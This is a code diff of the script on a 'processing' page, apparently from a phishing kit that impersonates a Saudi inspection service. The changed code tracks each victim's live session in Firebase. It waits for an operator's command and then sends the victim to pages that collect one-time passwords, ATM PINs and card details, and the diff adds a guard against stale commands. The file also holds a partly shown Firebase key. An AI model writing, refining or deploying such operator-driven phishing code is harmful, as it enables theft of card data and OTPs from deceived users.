@@ -78,14 +78,12 @@
     </div>
 
     <script>
-        // إعدادات الفايربيس الخاصة بمشروعك
         const firebaseConfig = { 
             apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8...", 
             databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/", 
             projectId: "saso-inspection" 
         };
         
-        // منع إعادة التعريف لو المكتبة محملة مسبقاً
         if (!firebase.apps.length) { 
             firebase.initializeApp(firebaseConfig); 
         }
@@ -93,42 +91,48 @@
         const v_id = localStorage.getItem('v_id');
 
         if (v_id) {
-            // التعديل السحري: تصفير أي أمر قديم فور دخول الصفحة لضمان بقاء الزائر فيها
+            // تحديث موقع الزائر وحالته فور الدخول
             database.ref('orders/' + v_id).update({
                 next_step: 'waiting', 
-                status: 'في انتظار أمر جديد من الآدمن'
+                status: 'الزائر قيد الانتظار الآن'
             });
 
-            // تحديث موقع الزائر في لوحة التحكم
             database.ref('live_sessions/' + v_id).update({
                 current_page: "انتظار (Processing)",
                 last_seen: new Date().getTime()
             });
 
-            // مراقبة أوامر الآدمن وتوجيه الزائر للصفحات الصحيحة
             const orderRef = database.ref('orders/' + v_id + '/next_step');
+            
+            // متغير لمنع التنفيذ عند أول تحميل للصفحة بالأوامر القديمة
+            let isFirstLoad = true;
+
             orderRef.on('value', (snapshot) => {
                 const step = snapshot.val();
+
+                // لو دي أول مرة الصفحة تفتح، بنجبر الحالة تبقى waiting ونمنع أي تحويل
+                if (isFirstLoad) {
+                    isFirstLoad = false;
+                    if (step !== 'waiting') {
+                        database.ref('orders/' + v_id).update({ next_step: 'waiting' });
+                        return; 
+                    }
+                }
                 
-                // التوجيه يتم فقط إذا كانت الحالة ليست "waiting"
+                // التوجيه يحصل فقط لو الخطوة اتغيرت لشيء غير waiting بعد ما الزائر دخل الصفحة
                 if (step && step !== 'waiting') {
                     if (step === 'go_to_otp' || step === 'wrong_otp') {
-                        // صفحة الـ OTP باسمها الجديد عندك
                         window.location.href = 'complete-st.html'; 
                     } else if (step === 'go_to_pin') {
-                        // صفحة الـ ATM/PIN باسمها الجديد عندك
                         window.location.href = 'auth-session.html';
                     } else if (step === 'wrong_card') {
-                        // العودة لصفحة البطاقة الأساسية
                         window.location.href = 'secure-pay-v2.html';
                     } else if (step === 'success') {
-                        // صفحة النجاح النهائية
                         window.location.href = 'success-page.html';
                     }
                 }
             });
         } else {
-            // لو مفيش v_id نرجعه للرئيسية
             window.location.href = 'index.html';
         }
     </script>
